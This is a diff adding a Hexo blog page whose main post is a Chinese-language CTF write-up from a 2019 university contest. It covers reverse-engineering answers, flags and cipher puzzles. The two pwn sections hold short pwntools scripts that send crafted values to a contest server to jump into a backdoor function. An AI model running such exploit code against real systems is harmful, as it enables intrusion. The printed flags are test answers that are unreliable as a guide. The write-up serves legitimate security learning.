@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="default">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-暨南大学个人赛林健斌wp" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/18/暨南大学个人赛林健斌wp/" class="article-date">
+  <time datetime="2019-03-17T16:20:55.921Z" itemprop="datePublished">2019-03-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/18/暨南大学个人赛林健斌wp/">暨南大学个人赛林健斌wp(IP:s1m0n)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#汇编</p>
+<p>##Easy_Elf</p>
+<p>IDA对汇编代码进行反编译，看到sub_8048451()函数的返回值很关键，如果返回1则能跳转到正确，进入该函数查看。</p>
+<p><img src="https://qqadapt.qpic.cn/txdocpic/0/db65e8ec11a64891ba909c9cb04305f3/0" alt="img"></p>
+<p>看到21和24的值很直观，21要求为0x31,24要求为0x58。函数对20，22，23进行了异或，运算后可得20要求为0x4c，22要求为0x4e，23要求为0x55</p>
+<p>查ASCII对应字符，按顺序排列得:L1NUX</p>
+<p>得到flag:flag{L1NUX}</p>
+<p>##div<br>文本文件为AT&amp;T格式的汇编代码，对代码进行翻译，了解了执行过程，但是不知道怎么求N，于是直接把汇编代码在linux上跑一下。</p>
+<p>先编写一个普通的C程序，如图，执行gcc -S 生成汇编代码，对其中add()函数部分进行修改，改为题目代码，gcc -c生成.o文件，再gcc生成可执行文件。</p>
+<p><img src="https://qqadapt.qpic.cn/txdocpic/0/5c755f44dd5bcbd0e71964a337fb6d85/0" alt="img"></p>
+<p>因为输出结果为x/N，因此考虑找输入值x，输入x时输出1，输入x-1时输出0，则x=N。二分法暴力破解。</p>
+<p><img src="https://qqadapt.qpic.cn/txdocpic/0/502ae615b66c04da06fba2a83d3afbf8/0" alt="img"></p>
+<p>最后得到结果，即为flag:flag{974873638438446}</p>
+<p>##windows-reverse<br>IDA查看汇编代码，F5反编译，看到第一个判断。</p>
+<p><img src="https://qqadapt.qpic.cn/txdocpic/0/0f68e4943a6dc76638e85e8122c39a9b/0" alt="img"></p>
+<p>看到v7!=2018，直接猜第一个输入是2018，正确，到第二个判断。</p>
+<p><img src="https://qqadapt.qpic.cn/txdocpic/0/fd9eb841232eef44c7212409fe933c9c/0" alt="img"></p>
+<p>看到判断v3，若为真则成功。v3最后被函数sub_401610赋值，进入查看。</p>
+<p><img src="https://qqadapt.qpic.cn/txdocpic/0/9cd974ac7bfddf060b7fc8f2a4c4eaa3/0" alt="img"></p>
+<p>看到这个字符串，应该是要判断是否相等。考虑到flag一般有含义，这里很明显是reverse_1s_very_easy的一个乱序字符串，因此直接试。。。成功。。。</p>
+<p>最后提交flag(一个大坑。。。要记得补上前面的2018):flag{2018reverse_1s_very_easy}</p>
+<p>#pwn</p>
+<p>##tutorial1<br>IDA反编译，非常简单的读入read，然后传值给buf数组，满足buf=0xbabababa即可。使用pwntools构造payload。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">HOST=<span class="string">'35.221.144.41'</span></span><br><span class="line">PORT=<span class="string">'10003'</span></span><br><span class="line">p=remote(HOST,PORT)</span><br><span class="line">p.recv()</span><br><span class="line">guess=p64(<span class="number">0xbabababa</span>)</span><br><span class="line">p.send(guess)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://qqadapt.qpic.cn/txdocpic/0/6702f191ab65fe8e36c3be6429801d58/0" alt="img"></p>
+<p>得到flag如上图</p>
+<p>##tutorial2<br>老规矩IDA反编译，看到有两次read()，第一次思路跟tutorial1一样，满足buf=0xdeadbeef即可。第二次read()把读入数据传入rax，然后call rax，因此rax填backdoor()地址即可。</p>
+<p><img src="https://qqadapt.qpic.cn/txdocpic/0/9cc5ed2a7e1114a058c0f9e3d7330e7c/0" alt="img"></p>
+<p><img src="https://qqadapt.qpic.cn/txdocpic/0/bbfd36acbd7c4722f5b6ae7a128c8b34/0" alt="img"></p>
+<p>backdoor()地址为0x4006e6，pwntools构造payload。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">HOST=<span class="string">'35.221.144.41'</span></span><br><span class="line">PORT=<span class="string">'10004'</span></span><br><span class="line">p=remote(HOST,PORT)</span><br><span class="line">p.recv()</span><br><span class="line">guess=p32(<span class="number">0xdeadbeef</span>)<span class="comment">#这里注意要是32位，如果用p64会直接把第二次读入的数据覆盖导致无法读入第二次数据</span></span><br><span class="line">p.send(guess)</span><br><span class="line">guess=p64(<span class="number">0x00000000004006e6</span>)</span><br><span class="line">p.send(guess)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://qqadapt.qpic.cn/txdocpic/0/ebb08788dd4c6c34b4e18549d955e877/0" alt="img"></p>
+<p>得到flag如上图</p>
+<p>#Misc</p>
+<p>##签到题<br>进去看公告即可</p>
+<p>##我最爱吃培根卷<br>培根密码，上网查对应，解得flag：flag{bacon}</p>
+<p>##和尚解密<br>上网查ctf 佛曰，查到一个在线解密网址:<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p>
+<p>输入解密即可得到flag:flag{xp0int666}</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/03/18/暨南大学个人赛林健斌wp/" data-id="cjtd4o96y0001ucterjv3xlxp" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/17/hello-world/" class="article-date">
+  <time datetime="2019-03-17T15:36:45.387Z" itemprop="datePublished">2019-03-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/17/hello-world/">Hello World</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/03/17/hello-world/" data-id="cjtd4o96h0000ucte6waeinoz" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/03/18/暨南大学个人赛林健斌wp/">暨南大学个人赛林健斌wp(IP:s1m0n)</a>
+          </li>
+        
+          <li>
+            <a href="/2019/03/17/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
